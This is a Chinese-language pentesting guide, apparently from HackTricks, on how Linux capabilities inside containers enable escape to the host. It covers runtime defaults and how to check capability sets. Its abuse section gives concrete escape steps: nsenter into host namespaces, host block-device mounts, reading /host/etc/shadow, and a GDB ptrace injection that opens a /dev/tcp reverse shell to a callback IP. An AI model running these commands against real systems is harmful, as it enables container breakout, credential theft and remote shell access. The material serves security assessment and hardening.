# 容器中的 Linux capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux capabilities 是容器安全中最重要的组成部分之一，因为它们回答了一个微妙但根本的问题：**在容器内，“root”究竟意味着什么？** 在普通 Linux 系统上，UID 0 历来意味着拥有一组非常广泛的权限。在现代内核中，这些权限被拆分为称为 capabilities 的更小单元。即使进程以 root 身份运行，只要相关 capabilities 已被移除，它仍可能无法执行许多强大的操作。 <sup>[[1]](#references)</sup>

容器高度依赖这种区分。为了兼容性或简便性，许多工作负载仍以容器内的 UID 0 启动。如果不移除 capabilities，这会非常危险。移除 capabilities 后，容器中的 root 进程仍可执行许多普通的容器内任务，同时无法执行更敏感的内核操作。因此，容器 shell 显示 `uid=0(root)` 并不自动意味着“host root”，甚至不意味着“拥有广泛的内核权限”。capability 集决定了这个 root 身份实际上有多大权限。

如需查看完整的 Linux capabilities 参考资料和许多滥用示例，请参阅：

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 工作原理

capabilities 会记录在多个集合中，包括 permitted、effective、inheritable、ambient 和 bounding 集合。对于许多容器评估来说，与其关注每个集合精确的内核语义，不如先回答一个更直接的实际问题：**这个进程现在能成功执行哪些特权操作？未来还可能获得哪些额外权限？** <sup>[[1]](#references)</sup>

这很重要，因为许多逃逸技术本质上是伪装成容器问题的 capability 问题。拥有 `CAP_SYS_ADMIN` 的工作负载可以使用大量正常容器 root 进程不应接触的内核功能。如果工作负载还与 host 共用 network namespace，那么拥有 `CAP_NET_ADMIN` 就会危险得多。如果工作负载能通过 host PID 共享看到 host 进程，那么拥有 `CAP_SYS_PTRACE` 就会带来更多风险。在 Docker 或 Podman 中，这可能表现为 `--pid=host`；在 Kubernetes 中，通常表现为 `hostPID: true`。

换句话说，不能孤立地评估 capability 集。必须结合 namespaces、seccomp 和 MAC policy 一起分析。

## 实验

在容器内检查 capabilities 的一种非常直接的方法是：

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

你还可以将限制更严格的容器与添加了所有 capabilities 的容器进行比较：

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

要查看仅添加一项能力的效果，可以尝试先移除所有能力，然后只加回一项能力：

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

这些小型实验有助于说明，runtime 并非只是切换一个名为“privileged”的布尔值，而是在塑造进程实际可用的权限面。

## 高风险 Capabilities

只有当某项操作触及**由主机控制的资源**时，Capabilities 才会成为逃逸原语。反复出现的高风险组合包括：

- **`CAP_SYS_ADMIN`** 加上主机 PID、块设备或可写的内核控制路径。加入目标 mount namespace 还需要 `CAP_SYS_CHROOT`；挂载基于块设备的文件系统则需要在初始 user namespace 中拥有 `CAP_SYS_ADMIN`。
- **`CAP_SYS_PTRACE`** 加上对主机 PID 的可见性，以及一个可附加的主机进程。ptrace 注入不需要 `CAP_SYS_ADMIN`。
- **`CAP_DAC_OVERRIDE` 或 `CAP_DAC_READ_SEARCH`** 加上可访问的主机文件系统。这些 capabilities 会绕过不同的 DAC 检查，但不会创建主机文件系统视图。
- 初始 user namespace 中的 **`CAP_SYS_MODULE`** 加上一个受支持且与内核兼容的模块。普通 Linux containers 共用节点内核；VM 或 userspace-kernel runtimes 会改变这一边界。
- 初始 user namespace 中的 **`CAP_MKNOD`** 加上一个已被 device cgroup 允许的真实主机设备。创建设备节点不会绕过 device cgroup。
- **`CAP_SYS_RAWIO`** 加上一个已暴露且可用的内存、I/O 端口、PCI 或设备控制接口。
- **`CAP_SYS_BOOT`** 加上初始 PID namespace，可重启主机；或者加上可用且获准的 kexec 路径，以替换内核。
- 主机 network namespace 中的 **`CAP_NET_ADMIN`**，可直接控制节点网络状态。**`CAP_NET_RAW`** 可参与特定协议的逃逸，但仅有 raw sockets 并不能获得节点 shell。

这里有意不把 `CAP_SYS_CHROOT` 列为单独的逃逸 capability。它可能是 mount namespace `setns()` 的必要条件，也能让已可访问的主机目录树更易于使用，但单独调用 `chroot()` 既不会暴露该目录树，也不会授予新的文件系统权限。同样，`CAP_BPF` 和 `CAP_PERFMON` 会开放强大的 telemetry 和内核攻击面，但如果没有独立的内核漏洞，它们的常规操作并不构成通用的 container 逃逸。

## Runtime 使用情况

Docker、Podman、基于 containerd 的栈以及 CRI-O 都使用 capability 控制，但默认设置和管理接口各不相同。Docker 通过 `--cap-drop` 和 `--cap-add` 等标志直接提供这些控制。Podman 提供类似的控制，并且通常会将其与 rootless 执行结合，作为额外的安全层。Kubernetes 通过 Pod 或 container 的 `securityContext` 配置 capability 的添加和移除；更底层的 runtimes 则会在 OCI runtime 配置中设置最终的集合。LXC 和 Incus 等系统 container 环境也依赖 capability 控制，但它们与主机更广泛的集成，可能会诱使运维人员比对应用 container 更激进地放宽默认设置。 <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

同一原则适用于所有这些环境：技术上可以授予的 capability，不一定就应该授予。许多真实事件都始于运维人员为了快速解决问题，在 workload 未能通过更严格的配置运行时，直接添加某项 capability。

## 配置错误

最明显的错误是在 Docker/Podman 风格的 CLI 中使用 **`--cap-add=ALL`**，但这并非唯一的问题。实际上，更常见的问题是授予一两个权限极强的 capability，尤其是 `CAP_SYS_ADMIN`，以便“让应用正常运行”，却没有同时了解 namespace、seccomp 和 mount 方面的影响。另一种常见的故障模式是将额外的 capabilities 与 host namespace 共享结合使用。在 Docker 或 Podman 中，这可能表现为 `--pid=host`、`--network=host` 或 `--userns=host`；在 Kubernetes 中，类似的暴露通常通过 `hostPID: true` 或 `hostNetwork: true` 等 workload 设置实现。每种组合都会改变 capability 实际能够影响的范围。

人们也常误以为，只要 workload 不是完全 `--privileged`，它就仍受到实质性限制。有时确实如此，但有时其有效安全态势已经足够接近 privileged，以至于这种区别在实际操作中不再重要。

## 滥用

先记录有效的 sets、user-namespace 映射、seccomp 状态、namespaces、mounts 和设备。脱离这些上下文，单凭 capability 名称无法证明存在逃逸：

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`：命名空间和块设备

在可以看到 host PID 的情况下，`CAP_SYS_ADMIN` 可以进入 host 命名空间。mount-namespace 操作还需要调用者所在 user namespace 中的 `CAP_SYS_CHROOT`。

**检查 capability 和 confinement：**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**枚举目标：**从容器/Pod 配置或明确无误的主机进程列表中确认是否共享主机 PID，然后检查目标命名空间。私有 PID 命名空间中也会存在本地 PID 1，因此仅凭它的存在并不能证明共享了主机 PID。

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**利用命名空间路径：**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

拥有目标的 user namespaces 中必须通过 capability 检查。`--pid=host` 或 Kubernetes `hostPID: true` 可以提供可见性，但不会提供 capabilities。

对于替代的块设备路径，先**枚举**候选项，再先以只读方式挂载经过验证的候选项，以**exploit**可访问的文件系统：

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

设备节点必须存在，device cgroup 必须允许访问该设备，而 block-filesystem 挂载需要在初始 user namespace 中拥有 `CAP_SYS_ADMIN`。已经 bind-mounted 到 `/host` 的 host root 无需 `CAP_SYS_ADMIN` 即可访问主机；`chroot /host` 只是为了方便，且需要单独具备 `CAP_SYS_CHROOT`。

### 可访问的 host root：直接执行文件系统操作

如果 host root 已挂载到 `/host`，先确认挂载情况，然后直接使用现有访问权限。这条路径不依赖 `CAP_SYS_ADMIN`：

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

如果 `chroot()` 不可用，但宿主机二进制文件与容器的架构和加载器兼容，通常可以通过已挂载的目录树调用它：

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

在 `/host` 下直接读取和写入已经构成对 host 文件系统的 compromise。`chroot()` 或执行 host binary 只是让这种访问更方便；这两种操作都不会创建 host mount，也不会绕过只读 mount 或 MAC policy。

### `CAP_SYS_PTRACE`：host-process injection

如果能看到 host PID，且在目标的 user namespace 中拥有 `CAP_SYS_PTRACE`，GDB 就能让一个获准的 host process 调用 `system()`。不需要 `CAP_SYS_ADMIN`。

**检查 capability 和 attachment controls：**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**枚举并选择一个可丢弃的目标：**从配置或明确无误的节点进程列表中确认是否共享主机 PID；绝不要选择 PID 1 或关键守护进程。

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**利用所选进程：**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

目标必须可附加，并且具有可用的 `system()` 符号和 Bash payload 路径。Yama、不可转储状态、seccomp、user namespaces 和 MAC policy 都可能阻断这条链。GDB 会在附加期间暂停目标，因此只能使用可丢弃的实验室进程。

### `CAP_DAC_OVERRIDE` 和 `CAP_DAC_READ_SEARCH`：受保护的主机文件

这些 capabilities 不会暴露主机文件系统。如果 `/host` 已经是主机挂载点，`CAP_DAC_READ_SEARCH` 可以绕过 DAC 读/搜索检查，而 `CAP_DAC_OVERRIDE` 还可以绕过常规写入检查：

**检查 capabilities：**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**枚举暴露的主机文件系统并检查目标权限：**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

在一次性实验环境中**练习读取和写入绕过**：

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

只读挂载和 LSM 规则仍然适用。`CAP_DAC_READ_SEARCH` 也授权调用 `open_by_handle_at()`，但像 Shocker 这样的逃逸还需要同一底层文件系统的挂载文件描述符、有效或可发现的句柄、兼容的文件系统/存储布局，并且不能受到 runtime 或 LSM 的阻止。它并不允许任意访问挂载命名空间之外的所有文件系统。

### `CAP_SYS_MODULE`：共享内核执行

在普通 Linux 容器中，已接受的模块会在共享的宿主机内核中运行。

**检查 capability 和 user namespace 的作用范围：**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**列举模块加载的前提条件：**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit 仅可在一次性节点上使用兼容且经过预先审查的 proof module：**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

该 capability 必须在初始 user namespace 中生效。内核版本和配置、模块签名、lockdown、seccomp 及 LSM 策略都必须允许加载。Kata、gVisor、Hyper-V isolation 及类似运行时会改变 workload 所触及的内核边界。

### `CAP_MKNOD`：创建允许的设备句柄

`CAP_MKNOD` 可以创建设备节点，但不能绕过 device cgroup。设备创建不受 namespace 隔离，因此该 capability 必须在初始 user namespace 中生效。

**检查 capability 和 user namespace 范围：**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**枚举真实设备、其主/次设备号，以及任何可见的 cgroup-v1 允许列表：**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**只读 Exploit 已验证的 ext-family 候选项：**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

其他文件系统需要匹配的只读工具；此外，挂载设备还需要 `CAP_SYS_ADMIN`。打开已创建的节点时出现 `Operation not permitted`，通常表示设备 cgroup 仍在阻止访问。在 cgroup v2 下，设备访问通常通过 BPF 强制执行，且不存在 `devices.list` 文件，因此成功打开才是决定性测试。

### `CAP_SYS_RAWIO`：暴露的 raw-I/O 接口

没有通用且可移植的 payload：有效地址和效果取决于硬件和内核配置。

**检查 capability 和 user namespace 范围：**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**枚举暴露的原始接口、硬件和驱动程序：**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**仅使用针对已识别设备和地址范围且已获批准的 exploit proof。** 如果 `/dev/mem` 是实验室批准的接口，此模板可证明节点内存泄露，而不会打印其内容：

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

地址必须来自实验室的硬件映射，因为读取某些 MMIO 区域可能产生副作用。使用通用内存写入命令会造成误导且不安全：同一地址在一台机器上可能无害，在另一台机器上却可能控制硬件或内核内存。Device cgroups、文件系统权限、严格的 `/dev/mem` 限制、kernel lockdown、虚拟化和 LSM 策略通常会阻止有用的访问。

### `CAP_SYS_BOOT`：namespace reboot 或 kernel 替换

在私有 PID namespace 中，`reboot()` 会终止该 namespace 的 init 进程，而不是重启主机。因此，要影响主机重启，需要使用初始 PID namespace，通常需要共享主机 PID。kexec 路径还需要兼容的 kernel 镜像，以及宽松的 lockdown/签名策略：

**检查 capability：**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**列出 PID namespace 和 kexec 的前提条件：**根据 workload 配置确认是否共享 host PID，因为仅凭 PID namespace 链接无法判断它是否属于 node 的初始 namespace。

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**仅当重启一次性实验室节点是明确的练习内容时，才进行 exploit：**

```bash
sync
reboot -f
```

不要仅仅为了证明该 capability 而在共享节点上执行该命令或加载内核。在私有 PID namespace 中，它只会终止该 namespace 的 init 进程，并不能证明会影响宿主机。

### `CAP_NET_ADMIN` 和 `CAP_NET_RAW`：宿主机网络路径

`CAP_NET_ADMIN` 只影响当前 network namespace。

**检查 capabilities 和隔离情况：**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**枚举当前网络，并从工作负载配置中确认主机网络：**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**可逆地使用 `CAP_NET_ADMIN`：**使用 host networking 时，临时接口是节点接口。

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` 允许使用 RAW 和 PACKET 套接字，但不等同于通用主机 shell。要**枚举**文档中记载的 GCE 攻击链，请检查 metadata 路由，并捕获明文 guest-agent 流量是否可被观察到：

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

如果存在匹配的前提条件，**exploit** 文档中记录的特定环境攻击链 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html)：捕获请求和序列状态，注入包含 SSH key 的伪造 metadata 响应，然后验证是否能访问 host。该攻击链要求 root、host networking、`CAP_NET_ADMIN`、`CAP_NET_RAW`、明文 GCE metadata 流量，以及可被竞态利用的 guest-agent 请求；现代传输方式或 agent 行为可能会使其失效。

### 本地来源限制和接口地址

listener 可能会拒绝源地址为 `127.0.0.1` 的连接，却忽略分配给同一 network namespace 的其他地址。如果该接口可访问 listener，可以比较 loopback 连接与绑定到现有非 loopback 本地地址的连接。`CAP_NET_ADMIN` 可以允许在当前 namespace 中配置接口，但如果已经分配了合适的地址，就不需要它。普通 TCP 连接不需要 `CAP_NET_RAW`。这是源地址分类缺陷，而不是容器逃逸，也不能证明应用会授权特权请求。<sup>[[1]](#references)[[7]](#references)</sup>

对于 WebSocket listener，有效的 HTTP `101 Switching Protocols` 响应表明 opening handshake 已完成；随后出现的应用层错误则可能表明连接已到达 handler。这两种响应都不能证明认证成功或请求的操作已成功。<sup>[[8]](#references)</sup>

## 检查

capability 检查的目标不仅是转储原始值，还要了解进程是否拥有足够的权限，使其当前的 namespace 和 mount 状况构成危险。

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

这里有哪些值得关注的内容：

- `capsh --print` 是发现高风险 capabilities（如 `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin` 或 `cap_sys_module`）最简单的方法。
- `/proc/self/status` 中的 `CapEff` 行会告诉你当前实际生效的 capabilities，而不只是其他集合中可能可用的 capabilities。
- 如果容器还共享 host PID、network 或 user namespaces，或者挂载了可写的 host 路径，那么 capability dump 就更加重要。

收集原始 capability 信息后，下一步是进行解读。需要确认进程是否为 root、user namespaces 是否启用、是否共享 host namespaces、seccomp 是否正在执行，以及 AppArmor 或 SELinux 是否仍在限制进程。单看 capability 集合并不能说明全部情况，但它往往能解释为什么一个容器 breakout 能成功，而另一个在表面上起点相同的容器却失败。

## 运行时默认配置

| 运行时 / 平台 | 默认状态 | 默认行为 | 常见的手动削弱方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认采用精简的 capability 集合 | Docker 保留默认的 capability allowlist，并丢弃其余 capabilities | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | 默认采用精简的 capability 集合 | Podman 容器默认是非特权的，并使用精简的 capability 模型 | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 除非更改，否则继承运行时默认配置 | 如果未指定 `securityContext.capabilities`，容器会获得运行时的默认 capability 集合 | `securityContext.capabilities.add`、未能设置 `drop: [\"ALL\"]`、`privileged: true` |
| Kubernetes 下的 containerd / CRI-O | 通常采用运行时默认配置 | 生效的集合取决于运行时和 Pod spec | 同 Kubernetes 行；直接的 OCI/CRI 配置也可以显式添加 capabilities |

对于 Kubernetes，关键在于 API 并未定义一套通用的默认 capability 集合。如果 Pod 没有添加或移除 capabilities，工作负载就会继承该节点上运行时的默认配置。

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux 容器配置](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker 文档 - 运行时特权和 Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes 文档 - 为容器设置 capabilities](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman 文档 - `--cap-add` 和 `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus 文档 - 安全](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux IPv4 协议实现](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - WebSocket 协议](https://www.rfc-editor.org/rfc/rfc6455.html)
